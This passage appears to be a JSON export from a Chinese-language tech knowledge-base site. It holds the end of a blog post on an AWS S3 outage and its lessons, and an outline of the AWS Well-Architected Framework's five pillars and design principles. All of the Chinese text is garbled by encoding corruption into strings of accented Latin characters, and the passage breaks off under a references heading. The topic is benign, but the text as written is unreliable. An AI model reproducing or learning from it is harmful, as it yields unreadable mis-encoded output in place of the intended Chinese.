ä¸ºåœ¨Amazonå·¥ä½œè¿‡ï¼Œæ‰€ä»¥å¤šå¤§æ¦‚çŸ¥é“æ˜¯ä¸ªä»€ä¹ˆæ•°é‡çº§ï¼Œè¿™é‡Œä¸èƒ½è¯´ï¼Œä¸è¿‡ï¼Œè€å®è¯´ï¼Œå¾ˆæƒŠäººçš„ï¼‰ï¼Œæ‰€ä»¥ï¼Œè¿™ä¸¤ä¸ªæ ¸å¿ƒæœåŠ¡åœ¨å¯åŠ¨æ—¶è¦é‡å»ºå¹¶æ ¡éªŒå¯¹è±¡ç´¢å¼•å…ƒæ•°æ®çš„å®Œæ•´æ€§ï¼Œè¿™ä¸ªè¿‡ç¨‹æ²¡æƒ³åˆ°èŠ±äº†è¿™ä¹ˆé•¿çš„æ—¶å€™ã€‚è€ŒPlacementæœåŠ¡ç³»ç»Ÿä¾èµ–äºIndex æœåŠ¡ï¼Œæ‰€ä»¥èŠ±äº†æ›´é•¿çš„æ—¶é—´ã€‚\r\n\r\näº†è§£è¿‡ç³»ç»Ÿåº•å±‚çš„æŠ€æœ¯äººå‘˜åº”è¯¥éƒ½çŸ¥é“è¿™ä¸¤ä¸ªæœåŠ¡æœ‰å¤šé‡è¦ï¼Œç®€è€Œè¨€ä¹‹ï¼Œè¿™ä¸¤ä¸ªç³»ç»Ÿå°±åƒæ˜¯Unix/Linuxæ–‡ä»¶ç³»ç»Ÿä¸­çš„inodeï¼Œæˆ–æ˜¯åƒHDFSé‡Œçš„node nameï¼Œå¦‚æœè¿™äº›å…ƒæ•°æ®ä¸¢å¤±ï¼Œé‚£ä¹ˆï¼Œç”¨æˆ·çš„æ‰€æœ‰æ•°æ®åŸºæœ¬ä¸Šæ¥è¯´å°±ç­‰äºå…¨ä¸¢äº†ã€‚\r\n\r\nè€Œè¦æ¢å¤ç´¢å¼•ç³»ç»Ÿï¼Œå°±åƒä½ çš„æ“ä½œç³»ç»Ÿä»å¼‚å¸¸å…³æœºåå¯åŠ¨ï¼Œæ–‡ä»¶ç³»ç»Ÿè¦åšç³»ç»Ÿè‡ªæ£€é‚£æ ·ï¼Œç¡¬ç›˜è¶Šå¤§ï¼Œæ–‡ä»¶è¶Šå¤šï¼Œè¿™ä¸ªè¿‡ç¨‹å°±è¶Šæ…¢ã€‚\r\n\r\nå¦å¤–ï¼Œè¿™æ¬¡ï¼ŒAWSæ²¡æœ‰ä½¿ç”¨åƒä»¥å‰é‚£æ · Outage çš„æ•…éšœåç§°ï¼Œç”¨çš„æ˜¯ â€œIncreased Error Rateâ€ è¿™æ ·çš„ä¸œè¥¿ã€‚æˆ‘ä¼°è®¡æ˜¯æ²¡æœ‰æŠŠæ‰€æœ‰è¿™ä¸¤ä¸ªæœåŠ¡åˆ é™¤å®Œï¼Œä¼°è®¡æœ‰äº›ç”¨æˆ·æ˜¯å¯ä»¥ç”¨çš„ï¼Œæœ‰çš„ç”¨æˆ·æ˜¯åˆ™ä¸è¡Œäº†ã€‚\r\n\r\n# åç»­æ”¹è¿›\r\n\r\nåœ¨è¿™ç¯‡æ•…éšœç®€æŠ¥ä¸­ï¼ŒAWS ä¹Ÿæåˆ°äº†ä¸‹é¢çš„è¿™äº›æ”¹è¿›æªæ–½â€”â€”\r\n\r\n- **æ”¹è¿›è¿ç»´æ“ä½œå·¥å…·ã€‚**å¯¹äºæ­¤æ¬¡æ•…éšœçš„è¿ç»´å·¥å…·ï¼Œæœ‰ä¸‹é¢æ”¹è¿›ï¼š\r\n  - **è®©åˆ é™¤æœåŠ¡è¿™ä¸ªæ“ä½œå˜æ…¢ä¸€äº›**ï¼ˆé™ˆçš“æ³¨ï¼šè¿™æ ·é”™äº†ä¹Ÿå¯ä»¥æœ‰æ—¶é—´åæ‚”ï¼Œç›¸å¯¹äºä¸€ä¸ªå¤§è§„æ¨¡çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œè¿™æ‹›è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œè‡³å°‘åœ¨ç³»ç»ŸæŠ¥è­¦æ—¶æœ‰ä¹Ÿå¯ä»¥æŒ½æ•‘ï¼‰\r\n  - **åŠ ä¸Šä¸€ä¸ªæœ€å°èµ„æºæ•°é™åˆ¶çš„SafeGuard**ï¼ˆé™ˆçš“æ³¨ï¼šå°±æ˜¯è¯´ï¼Œä»»ä½•æœåŠ¡åœ¨è¿è¡Œæ—¶éƒ½åº”è¯¥æœ‰ä¸€ä¸ªæœ€å°èµ„æºæ•°ï¼Œåˆ†å¸ƒå¼é›†ç¾¤æ§åˆ¶ç³»ç»Ÿä¼šå¼ºè¡Œç»´æŠ¤æœåŠ¡æ­£å¸¸è¿è¡Œçš„æœ€å°çš„ä¸€ä¸ªèµ„æºæ•°ï¼‰\r\n  - ä¸¾ä¸€åä¸‰ï¼ŒReviewæ‰€æœ‰å’Œå…¶å®ƒçš„è¿ç»´å·¥å…·ï¼Œä¿è¯ä»–ä»¬ä¹Ÿç›¸å…³çš„æ£€æŸ¥ã€‚\r\n- **æ”¹è¿›æ¢å¤è¿‡ç¨‹ã€‚**å¯¹äºæ¢å¤æ—¶é—´è¿‡é•¿çš„é—®é¢˜ï¼Œæœ‰å¦‚ä¸‹æ”¹è¿›ï¼š\r\n  - **åˆ†è§£ç°æœ‰åšé‡çš„é‡è¦æœåŠ¡æˆæ›´å°çš„å•å…ƒ**ï¼ˆåœ¨ AWSï¼ŒServiceæ˜¯å¤§æœåŠ¡ï¼Œå°æœåŠ¡è¢«ç§°ä¹‹ä¸º Cellï¼‰ï¼ŒAWS ä¼šæŠŠè¿™å‡ ä¸ªé‡è¦çš„æœåŠ¡é‡æ„æˆ CellæœåŠ¡ã€‚ï¼ˆé™ˆçš“æ³¨ï¼šè¿™åº”è¯¥å°±æ˜¯æ‰€è°“çš„â€œå¾®æœåŠ¡â€äº†å§ï¼‰ã€‚è¿™æ ·ï¼ŒæœåŠ¡ç²’åº¦å˜å°ï¼Œé‡å¯ä¹Ÿä¼šå¿«ä¸€äº›ï¼Œè€Œä¸”è¿˜å¯ä»¥å‡å°‘æ•…éšœé¢ï¼ˆåŸæ–‡ï¼šblast radius â€“ çˆ†ç‚¸åŠå¾„ï¼‰\r\n  - **ä»Šå¹´å†…å®Œæˆå¯¹ Index ç´¢å¼•æœåŠ¡çš„åˆ†åŒºè®¡åˆ’ã€‚**\r\n\r\n# ç›¸å…³æ€è€ƒ\r\n\r\nä¸‹é¢æ˜¯æˆ‘å¯¹è¿™ä¸€æ•…éšœçš„ç›¸å…³æ€è€ƒâ€”â€”\r\n\r\n- **å¤ªå–œæ¬¢åƒGitlabå’ŒAWSè¿™æ ·çš„æ•…éšœå…¬å¼€äº†,** é‚£æ€•æ˜¯ä¸€ä¸ªè‡ªå·±äººä¸ºçš„ä½çº§é”™è¯¯ã€‚ä¸æ©ç›–ï¼Œä¸æ–‡è¿‡é¥°éï¼Œé€æ˜ä¸”è¯šæ³ã€‚Cool!\r\n  1ï¼‰è¿™æ¬¡äº‹ä»¶ï¼Œè¿˜å¥½æ²¡æœ‰ä¸¢å¤±è¿™ä¹ˆé‡è¦çš„æ•°æ®ï¼Œä¸ç„¶çš„è¯ï¼Œå°†æ˜¯ç¾éš¾æ€§çš„ã€‚\r\n  2ï¼‰å¦å¤–ï¼Œé¢å¯¹åœ¨ US-EASE-1 è¿™ä¸ªè€ç‰Œ Region ä¸Šçš„æµ·é‡çš„å¯¹è±¡ï¼Œè€Œä¸”èƒ½åœ¨å‡ ä¸ªå°æ—¶å†…æ¢å¤ï¼Œå¾ˆä¸å®¹æ˜“äº†ã€‚\r\n  3ï¼‰è¿™ä¸ªäº‹ä»¶ï¼Œå†æ¬¡æ˜ è¯äº†æˆ‘åœ¨[ã€Šå…³äºé«˜å¯ç”¨çš„ç³»ç»Ÿã€‹](https://coolshell.cn/articles/17459.html)ä¸­æåˆ°çš„è§‚ç‚¹ï¼š**ä¸€ä¸ªç³»ç»Ÿçš„é«˜å¯ç”¨çš„å› ç´ å¾ˆå¤šï¼Œä¸ä»…ä»…åªæ˜¯ç³»ç»Ÿæ¶æ„ï¼Œæ›´é‡è¦çš„æ˜¯â€”â€”é«˜å¯ç”¨è¿ç»´ã€‚**\r\n  4ï¼‰å¯¹äºé«˜å¯ç”¨çš„è¿ç»´ï¼Œ**å¹³æ—¶çš„æ•…éšœæ¼”ä¹ æ˜¯å¾ˆé‡è¦çš„.** AWS å¹³æ—¶åº”è¯¥æ²¡æœ‰ç›¸åº”çš„æ•…éšœæ¼”ä¹ ï¼Œæ‰€ä»¥å¯¼è‡´è¦ä¹ˆé•¿æœŸä¸å‡ºæ•…éšœï¼Œä¸€å‡ºå°±å‡ºä¸ªå¤§çš„è®©ä½ æªæ‰‹ä¸åŠã€‚è¿™ç‚¹ï¼ŒFacebookå°±å¥½ä¸€äº›ï¼Œä»–ä»¬æ¯ä¸ªå­£åº¦æ‰”ä¸ªéª°å­ï¼Œéšæœºå…³æ‰ä¸€ä¸ªIDCä¸€å¤©ã€‚Netflix ä¹Ÿæœ‰ç›¸å…³çš„ Chaos Monkeyï¼Œæˆ‘ä»¥å‰åœ¨çš„è·¯é€æ¯å¹´ä¹Ÿä¼šåšä¸€æ¬¡å¤§è§„æ¨¡çš„æ•…éšœæ¼”ç»ƒâ€”â€”ç¾éš¾æ¼”ä¹ ã€‚\r\n  5ï¼‰AWSå¯¹äºåç»­çš„æ”¹è¿›å¯ä»¥çœ‹å‡ºä»–çš„æŠ€æœ¯èŒƒå„¿ã€‚å¯ä»¥çœ‹åˆ°å…¶æ”¹è¿›æ–¹æ¡ˆæ˜¯ç”¨æŠ€æœ¯è®©è‡ªå·±çš„ç³»ç»Ÿæ›´ä¸ºçš„é«˜å¯ç”¨ã€‚\r\n- ç„¶åï¼Œå¯¹æ¯”å›½å†…çš„å…¬å¸å¯¹äºè¿™æ ·çš„æ•…éšœï¼ŒåŸºæœ¬ä¸Šä¼šæ˜¯ä¸‹é¢è¿™æ ·çš„ç”»é£ï¼š\r\n  aï¼‰åŠ ä¸Šæ›´å¤šæ›´ä¸ºä¸¥æ ¼çš„å˜æ›´å’Œå®¡æ‰¹æµç¨‹ï¼Œ\r\n  bï¼‰ä½¿ç”¨é™åˆ¶æ›´å¤šçš„æƒé™ç³»ç»Ÿå’Œå®¡æ‰¹ç³»ç»Ÿ\r\n  cï¼‰ä½¿ç”¨æ›´å¤šçš„äººæ¥å¹²æ´»ï¼ˆä¸€ä¸ªäººå¹²äº‹ï¼Œå¦ä¸€ä¸ªäººåœ¨æ—è¾¹çœ‹ï¼‰\r\n  dï¼‰ä½¿ç”¨æ›´ä¸ºåšé‡çš„æµ‹è¯•å’Œå‘å¸ƒè¿‡ç¨‹\r\n  eï¼‰æƒ©ç½šæ•…éšœäººï¼Œç”¨ä»·å€¼è§‚æ•™è‚²å·¥ç¨‹å¸ˆã€‚\r\n\r\nè¿™è¿˜æ˜¯æˆ‘è€ç”Ÿé•¿è°ˆçš„é‚£å¥è¯â€”â€”**å¦‚æœä½ æ˜¯ä¸€ä¸ªæŠ€æœ¯å…¬å¸ï¼Œä½ å°±ä¼šæ›´å¤šçš„ç›¸ä¿¡æŠ€æœ¯è€Œä¸æ˜¯ç®¡ç†ã€‚ç›¸ä¿¡æŠ€æœ¯ä¼šç”¨æŠ€æœ¯æ¥è§£å†³é—®é¢˜ï¼Œç›¸ä¿¡ç®¡ç†ï¼Œé‚£å°±åªä¼šæœ‰åˆ¶åº¦ã€æµç¨‹å’Œä»·å€¼è§‚æ¥è§£å†³é—®é¢˜ã€‚**ï¼ˆæ³¨æ„ï¼šè¿™é‡Œæˆ‘å¹¶æ²¡æœ‰éš”ç¦»æŠ€æœ¯å’Œç®¡ç†ï¼Œåªæ˜¯æ›´ä¸ºå€¾å‘äºç”¨æŠ€æœ¯è§£å†³é—®é¢˜ï¼‰\r\n\r\n**æœ€åï¼Œä½ æ˜¯è¦å»ºä¸€ä¸ª â€œé«˜å¯ç”¨çš„æŠ€æœ¯ç³»ç»Ÿâ€ ï¼Œè¿˜æ˜¯ä¸€ä¸ª â€œé«˜ç”¨çš„ç®¡ç†ç³»ç»Ÿâ€ï¼Ÿ ;-)**"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/è¡Œä¸šè§‚å¯Ÿ/AWS/AWSæ¶æ„è®¾è®¡æœ€ä½³å®è·µ/","title":"AWSæ¶æ„è®¾è®¡æœ€ä½³å®è·µ"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: AWSæ¶æ„è®¾è®¡æœ€ä½³å®è·µ\r\ntags:\r\n- è¡Œä¸šè§‚å¯Ÿ\r\n- AWS\r\n- æ¶æ„\r\n---\r\n\r\n# AWS è‰¯å¥½æ¶æ„æ¡†æ¶\r\n\r\næ ¹æ®å¤šå¹´æ¥AWSçš„ä¸“å®¶ä»¬ç§¯ç´¯çš„ç»éªŒï¼Œåˆ›å»ºäº†è¿™ä¸€ä»½AWSè‰¯å¥½æ¶æ„æ¡†æ¶ï¼Œå…¶ä¸­åŒ…å«äº†ä»¥ä¸‹äº”å¤§æ”¯æŸ±ï¼š\r\n\r\n- å®‰å…¨æ€§ï¼ˆSecurityï¼‰\r\n- å¯é æ€§ï¼ˆReliabilityï¼‰\r\n- æ€§èƒ½æ•ˆç‡ï¼ˆPerformance Efficiencyï¼‰\r\n- æˆæœ¬ä¼˜åŒ–ï¼ˆCost Optimisationï¼‰\r\n- å“è¶Šæ“ä½œï¼ˆOperational Excellenceï¼‰\r\n\r\nä¸‹é¢ç®€å•æ€»ç»“ä¸€ä¸‹æ¯ä¸€ä¸ªæ”¯æŸ±é‡Œé¢çš„å†…å®¹\r\n\r\n- å®‰å…¨æ€§\r\n  - èº«ä»½ä¸è®¿é—®ç®¡ç†ï¼ˆIdentity and Access Mangementï¼‰\r\n    - å¦‚ä½•ä¿æŠ¤ä½ çš„AWSæ ¹è´¦å·çš„å®‰å…¨æ€§ï¼Ÿ\r\n    - å¦‚ä½•å®šä¹‰è§’è‰²å’Œè´£ä»»æ¥ç®¡ç†äººå‘˜è®¿é—®AWSèµ„æºï¼ˆé€šè¿‡ç®¡ç†æ§åˆ¶å°ä»¥åŠé€šè¿‡APIï¼‰\r\n    - å¦‚ä½•é™åˆ¶ä½ çš„ç¨‹åºè®¿é—®AWSèµ„æºï¼ˆåº”ç”¨ç¨‹åºã€è„šæœ¬ã€ç¬¬ä¸‰æ–¹å·¥å…·æˆ–æœåŠ¡ï¼‰\r\n    - å¦‚ä½•ç®¡ç†ä½ çš„ç®¡ç†å¯†é’¥å’Œå‡­è¯ï¼Ÿ\r\n  - æ£€æµ‹æ§åˆ¶ï¼ˆDetective Controlsï¼‰\r\n    - å¦‚ä½•æ•æ‰å’Œåˆ†æAWSçš„æ—¥å¿—ï¼Ÿ\r\n  - åŸºç¡€è®¾æ–½ä¿æŠ¤ï¼ˆInfrastructure Protectionï¼‰\r\n    - å¦‚ä½•ä¿æŠ¤å®ä¾‹çš„å®‰å…¨ï¼Œå¦‚ä½•ä¿æŠ¤ç½‘ç»œçš„å®‰å…¨ï¼Ÿ\r\n    - å¦‚ä½•ä¿æŠ¤AWSæœåŠ¡çš„å®‰å…¨ï¼Ÿ\r\n    - å¦‚ä½•ä¿æŠ¤æ“ä½œç³»ç»Ÿå’ŒEC2å®ä¾‹çš„å®‰å…¨ï¼Ÿï¼ˆæ˜¯å¦æœ‰è¡¥ä¸ï¼Œæ€æ¯’è½¯ä»¶ç­‰ï¼‰\r\n  - æ•°æ®ä¿æŠ¤ï¼ˆData Protectionï¼‰\r\n    - å¦‚ä½•åŠ å¯†å’Œä¿æŠ¤ä½ çš„æ•°æ®å­˜å‚¨\r\n    - å¦‚ä½•åŠ å¯†å’Œä¿æŠ¤ä½ çš„æ•°æ®ä¼ è¾“\r\n  - äº‹ä»¶å“åº”ï¼ˆIncident Responseï¼‰\r\n- å¯é æ€§\r\n  - åŸºç¡€ï¼ˆFoundationsï¼‰\r\n    - å¦‚ä½•ç®¡ç†AWSè´¦å·å†…çš„æœåŠ¡é™åˆ¶\r\n    - å¦‚ä½•ç®¡ç†å’Œè§„åˆ’AWSå†…çš„ç½‘ç»œæ‹“æ‰‘\r\n    - å¦‚ä½•æ‰¾åˆ°AWSæŠ€æœ¯æ”¯æŒï¼Œæ˜¯å¦æœ‰ä¸“é—¨çš„TAMï¼ˆTechnical Account Mangerï¼‰æ”¯æŒ\r\n  - å˜æ›´ç®¡ç†ï¼ˆChange Managementï¼‰\r\n    - å¦‚ä½•è®©ä½ çš„ç³»ç»Ÿé€‚åº”çœŸå®çš„éœ€æ±‚ï¼Ÿ\r\n    - å¦‚ä½•ç›‘æ§ä½ çš„AWSèµ„æºï¼Ÿ\r\n    - å¦‚ä½•æ‰§è¡Œå˜æ›´ç®¡ç†\r\n  - æ•…éšœç®¡ç†ï¼ˆFailure Managementï¼‰\r\n    - å¦‚ä½•å¤‡ä»½ä½ çš„æ•°æ®ï¼Ÿ\r\n    - ç³»ç»Ÿå†…ç»„ä»¶å‡ºç°æ•…éšœéœ€è¦å¦‚ä½•å¤„ç†ï¼Ÿ\r\n    - ä½ çš„æ•…éšœæ¢å¤è®¡åˆ’æ˜¯ä»€ä¹ˆï¼Ÿ\r\n- æ€§èƒ½æ•ˆç‡\r\n  - è®¡ç®—ï¼ˆComupteï¼‰\r\n    - å¦‚ä½•é€‰æ‹©é€‚åˆä½ çš„ç³»ç»Ÿçš„å®ä¾‹ç±»å‹ï¼Ÿ\r\n    - å¦‚ä½•ç¡®ä¿ä½ æ‰€ä½¿ç”¨çš„æ˜¯æœ€æ–°/æœ€é€‚åˆçš„å®ä¾‹ç±»å‹ï¼Ÿ\r\n    - å¦‚ä½•ç›‘æ§å®ä¾‹æ¥ç¡®ä¿å®ƒä»¬çš„æ€§èƒ½è¾¾åˆ°äº†è¦æ±‚ï¼Ÿ\r\n    - å¦‚ä½•ç¡®ä¿å®ä¾‹çš„æ•°é‡æ»¡è¶³ä¸šåŠ¡çš„éœ€æ±‚ï¼Ÿ\r\n  - å­˜å‚¨ï¼ˆStorageï¼‰\r\n    - å¦‚ä½•é€‰æ‹©é€‚åˆä½ çš„ç³»ç»Ÿçš„å­˜å‚¨æ–¹æ¡ˆï¼Ÿ\r\n    - å¦‚ä½•ç¡®ä¿ä½ æ‰€ä½¿ç”¨çš„æ˜¯æœ€æ–°/æœ€é€‚åˆçš„å­˜å‚¨ç³»ç»Ÿï¼Ÿ\r\n    - å¦‚ä½•ç›‘æ§ä½ çš„å­˜å‚¨ç³»ç»Ÿæ¥ä¿è¯å…¶æ€§èƒ½ï¼Ÿ\r\n    - å¦‚ä½•ç¡®ä¿å­˜å‚¨çš„å®¹é‡æ»¡è¶³ä½ çš„ä¸šåŠ¡éœ€æ±‚ï¼Ÿ\r\n  - æ•°æ®åº“ï¼ˆDatabaseï¼‰\r\n    - å¦‚ä½•é€‰æ‹©é€‚åˆä½ ç³»ç»Ÿçš„æ•°æ®åº“æ–¹æ¡ˆï¼Ÿ\r\n    - å¦‚ä½•ä¿è¯å½“æ–°çš„æ•°æ®åº“æ–¹æ¡ˆå‘å¸ƒçš„æ—¶å€™ä½ ç”¨å“ªä¸€ç§æ•°æ®åº“æœ€åˆé€‚ï¼Ÿ\r\n    - å¦‚ä½•ç›‘æ§æ•°æ®åº“ä¿è¯å…¶æ€§èƒ½è¾¾åˆ°è¦æ±‚ï¼Ÿ\r\n    - å¦‚ä½•ä¿è¯æ•°æ®åº“çš„å®¹é‡å’Œååé‡å¯ä»¥æ»¡è¶³ä¸šåŠ¡éœ€æ±‚ï¼Ÿ\r\n  - ç½‘ç»œï¼ˆNetworkï¼‰\r\n    - å¦‚ä½•é€‰æ‹©åˆé€‚çš„ç½‘ç»œæ–¹æ¡ˆï¼Ÿ\r\n    - å¦‚ä½•ä¿è¯æ–°çš„ç½‘ç»œæŠ€æœ¯å‡ºç°çš„æ—¶å€™ä½ ä½¿ç”¨å“ªä¸€ç§ç½‘ç»œæ–¹æ¡ˆæœ€åˆé€‚ï¼Ÿ\r\n    - å¦‚ä½•ç›‘æ§ä½ çš„ç½‘ç»œä¿è¯å…¶æ€§èƒ½ï¼Ÿ\r\n    - å¦‚ä½•ç¡®ä¿ç½‘ç»œæ€§èƒ½æ»¡è¶³ä¸šåŠ¡éœ€æ±‚ï¼Ÿ\r\n- æˆæœ¬ä¼˜åŒ–\r\n  - æˆæœ¬æ•ˆç‡é«˜çš„èµ„æº\r\n    - å¦‚ä½•é€‰æ‹©åˆé€‚çš„èµ„æºç±»å‹æ¥æ»¡è¶³æ”¯å‡ºéœ€æ±‚ï¼Ÿ\r\n    - å¦‚ä½•é€‰æ‹©åˆé€‚çš„æ”¶è´¹æ¨¡å¼æ¥æ»¡è¶³æ”¯å‡ºéœ€æ±‚ï¼Ÿï¼ˆæŒ‰éœ€å®ä¾‹ï¼Œé¢„ç•™å®ä¾‹å’Œç«ä»·å®ä¾‹ï¼‰\r\n    - æ˜¯å¦æœ‰å…¶ä»–æœåŠ¡æ¥ä»£æ›¿ç°æœ‰çš„æœåŠ¡å¯ä»¥å¢åŠ ä½ çš„æŠ•èµ„å›æŠ¥ç‡ï¼Ÿï¼ˆæ¯”å¦‚ç”¨S3é™æ€ç½‘ç«™ä»£æ›¿EC2ï¼ŒLambdaä»£æ›¿EC2ç­‰ï¼‰\r\n  - ä¾›éœ€åŒ¹é…\r\n    - å¦‚ä½•ç¡®ä¿ä½ çš„å®¹é‡æ»¡è¶³ä½ çš„éœ€æ±‚åˆä¸ä¼šè¶…å‡ºéœ€æ±‚å¤ªå¤šï¼Ÿ\r\n    - å¦‚ä½•ä¼˜åŒ–å¯¹AWSæœåŠ¡çš„ä½¿ç”¨ï¼Ÿ\r\n  - æ”¯å‡ºè®¤çŸ¥\r\n    - ä½¿ç”¨å“ªä¸€äº›è®¿é—®æ§åˆ¶å’Œæµç¨‹æ¥æ§åˆ¶AWSçš„è´¹ç”¨ï¼Ÿ\r\n    - å¦‚ä½•ç›‘æ§æˆ‘ä»¬çš„AWSç”¨é‡å’Œè´¹ç”¨ï¼Ÿ\r\n    - å¦‚ä½•å°†æˆ‘ä»¬ä¸ä½¿ç”¨çš„èµ„æºç»™å…³é—­ï¼Ÿ\r\n    - å¦‚ä½•åœ¨è®¾è®¡æ¶æ„çš„æ—¶å€™è€ƒè™‘æ•°æ®ä¼ è¾“çš„è´¹ç”¨ï¼Ÿ\r\n  - ä¸æ–­ä¼˜åŒ–\r\n    - æˆ‘ä»¬å¦‚ä½•ç®¡ç†å’Œè€ƒè™‘ä½¿ç”¨æ›´æ–°çš„æœåŠ¡ï¼Ÿ\r\n- å“è¶Šæ“ä½œ\r\n  - ç­¹å¤‡ï¼ˆPreparationï¼‰\r\n    - ä½ ä½¿ç”¨çš„äº‘æ“ä½œæµç¨‹æœ‰ä»€ä¹ˆæœ€ä½³å®è·µï¼Ÿ\r\n    - ä½ å¦‚ä½•è¿›è¡Œé…ç½®ç®¡ç†ï¼Ÿ\r\n  - æ“ä½œï¼ˆOperationï¼‰\r\n    - å¦‚ä½•åœ¨æœ€å°å˜æ›´å½±å“çš„æƒ…å†µä¸‹å¯¹çš„ä½ ä¸šåŠ¡ç³»ç»Ÿè¿›è¡Œå˜é©ï¼Ÿ\r\n    - å¦‚ä½•ç›‘æ§ä½ çš„ç³»ç»Ÿæ¥ä¿è¯å®ƒå¯ä»¥æŒ‰é¢„æœŸä¸€æ ·è¿è¡Œï¼Ÿ\r\n  - æ¼”è¿›ï¼ˆResponseï¼‰\r\n    - å¦‚ä½•å¤„ç†æ„æ–™ä¹‹å¤–çš„è¿è¥äº‹ä»¶ï¼Ÿ\r\n    - åœ¨å¤„ç†æ„æ–™ä¹‹å¤–çš„äº‹ä»¶çš„æ—¶å€™æœ‰ä»€ä¹ˆäº‹ä»¶å‡çº§çš„æµç¨‹ï¼Ÿ\r\n\r\n# ä¸€èˆ¬æ€§è®¾è®¡åŸåˆ™\r\n\r\nè‰¯å¥½æ¶æ„æ¡†æ¶å®šä¹‰äº†ä¸€ç³»åˆ—ä¸€èˆ¬æ€§è®¾è®¡åŸåˆ™ï¼ŒåŒ…æ‹¬äº†ï¼š\r\n\r\n- ![X9ITiT](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/X9ITiT.jpg)\r\n\r\n- **ä¸éœ€å†çŒœæµ‹æ‚¨çš„å®¹é‡éœ€æ±‚:** åœ¨ä»¥å¾€çš„åŸºç¡€æ¶æ„éƒ¨ç½²ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€é¢ä¸´ç€é«˜æˆæœ¬é—²ç½®çš„èµ„æºæˆ–è€…èµ„æºå®¹é‡ç´§å¼ å¯¼è‡´ä¸šç»©å—æŸçš„æƒ…å†µã€‚åˆ©ç”¨äº‘è®¡ç®—ï¼Œè¿™ä¸ªé—®é¢˜å¯ä»¥å¾—åˆ°è§£å†³ã€‚ä½ å¯ä»¥å…ˆå°½å¯èƒ½ä½¿ç”¨è¾ƒå°‘çš„å®¹é‡ï¼Œç„¶ååœ¨åæœŸæ ¹æ®éœ€æ±‚è¿›è¡Œéšæ„ä¼¸ç¼©ã€‚\r\n- **ä»¥ç”Ÿäº§è§„æ¨¡è¿›è¡Œç³»ç»Ÿæµ‹è¯•:** æˆ‘ä»¬å¯ä»¥åœ¨äº‘ç¯å¢ƒä¸­è½»æ¾æ­å»ºä¸ç”Ÿäº§ç¯å¢ƒ1:1çš„æµ‹è¯•ç¯å¢ƒï¼Œåœ¨åšå®Œä¸€ç³»åˆ—æµ‹è¯•ä¹‹åæ¸…ç©ºè¿™äº›èµ„æºï¼ŒåŒæ—¶åªä¸ºä½¿ç”¨çš„èµ„æºå’Œæ—¶é—´è€Œä»˜è´¹ã€‚è¿™åœ¨ä¼ ç»ŸåŸºç¡€æ¶æ„ç¯å¢ƒä¸­æ˜¯æ— æ³•è½»æ¾è¾¾åˆ°çš„ã€‚æˆ‘ä»¬å¯ä»¥å¦‚ä¹‹å‰å®éªŒæ‰€ç¤ºï¼Œä½¿ç”¨CloudFormationåœ¨åŠå°æ—¶å†…æ­å»ºä¸€å¥—å¤æ‚çš„åŸºç¡€æ¶æ„ï¼Œå¹¶ä¸”åœ¨ä½¿ç”¨å®Œæ¯•åå°†å…¶å®Œå…¨åˆ é™¤ã€‚\r\n- **è‡ªåŠ¨ç®€åŒ–æ¶æ„å®éªŒ:** åœ¨äº‘è®¡ç®—ç¯å¢ƒä¸­ï¼Œè‡ªåŠ¨åŒ–å¯ä»¥å¸®åŠ©æˆ‘ä»¬é™ä½æˆæœ¬ä»¥åŠæ‰‹åŠ¨æ“ä½œå¸¦æ¥çš„ç§ç§æŠ•å…¥ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨CloudTrailè¿½è¸ªå„ç§å˜æ›´ã€å®¡è®¡ç›¸å…³çš„å½±å“å¹¶ä¸”åœ¨å¿…è¦æ—¶è¿›è¡Œæ¢å¤ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä¾‹å¦‚Lambdaå‡½æ•°æ¥è¿›è¡Œå¤§é‡è‡ªåŠ¨åŒ–çš„å·¥ä½œã€‚\r\n- **å…è®¸å®ç°æ¶æ„æ¼”è¿›:** åœ¨ä¼ ç»Ÿç¯å¢ƒä¸­ï¼Œå¯¹åº”ç”¨ç¨‹åºæ¶æ„çš„å˜æ›´å‘¨æœŸéå¸¸é•¿ã€‚æƒ³è±¡ä¸€ä¸‹æˆ‘ä»¬ä½¿ç”¨ITILå¯¹ç³»ç»Ÿç”Ÿå‘½å‘¨æœŸè¿›è¡Œç®¡ç†ï¼Œéšç€ä¸šåŠ¡çš„å‘å±•ï¼Œæˆ‘ä»¬çš„æ¶æ„å¯èƒ½æ— æ³•é€‚åº”ä¸æ–­å˜åŒ–çš„ä¸šåŠ¡éœ€æ±‚ï¼Œä½†æ˜¯æ›´æ”¹ç³»ç»Ÿçš„é£é™©éå¸¸é«˜ã€‚åœ¨äº‘è®¡ç®—çš„ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å·§å¦™åˆ©ç”¨è‡ªåŠ¨åŒ–ã€DevOpsã€IaaC (Infrastrature as a Code)çš„ç‰¹æ€§æ¥å¯¹æ¶æ„è¿›è¡Œæ›´å¿«é€Ÿçš„è¿­ä»£ï¼Œå®ç°æ•æ·å¼€å‘ï¼ˆAgileï¼‰ã€‚\r\n- **æ•°æ®é©±åŠ¨å‹æ¶æ„:** åœ¨äº‘ç¯å¢ƒä¸­ï¼Œä½ å¯ä»¥é€šè¿‡CloudWatchæ”¶é›†ç›¸å…³æ•°æ®ï¼Œæ¥äº†è§£ä½ çš„æ¶æ„è´Ÿè½½æƒ…å†µã€‚ä½ çš„äº‘åŸºç¡€æ¶æ„ä»¥ä»£ç çš„å½¢å¼å­˜åœ¨ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨è¿™äº›æ•°æ®æ¥æ”¹å–„ä½ çš„æ¶æ„ã€‚\r\n- **é€šè¿‡æ¨¡æ‹Ÿä¿ƒé”€æ—¥å®ç°æ”¹è¿›:** é€šè¿‡æ¨¡æ‹Ÿä¾‹å¦‚æ·˜å®åŒ11ï¼Œäº¬ä¸œ618ç­‰ä¿ƒé”€æ—¥çš„å¤§å‹æµé‡ï¼Œæ¥æ”¹è¿›æ¶æ„ä¸­çš„ä¸è¶³ä¹‹å¤„ï¼Œå¹¶ä¸”ç§¯ç´¯åº”å¯¹çš„ç»éªŒå’Œæ–¹æ¡ˆ ã€‚\r\n\r\n# å‚è€ƒèµ„æ–™\r\n\r\n- 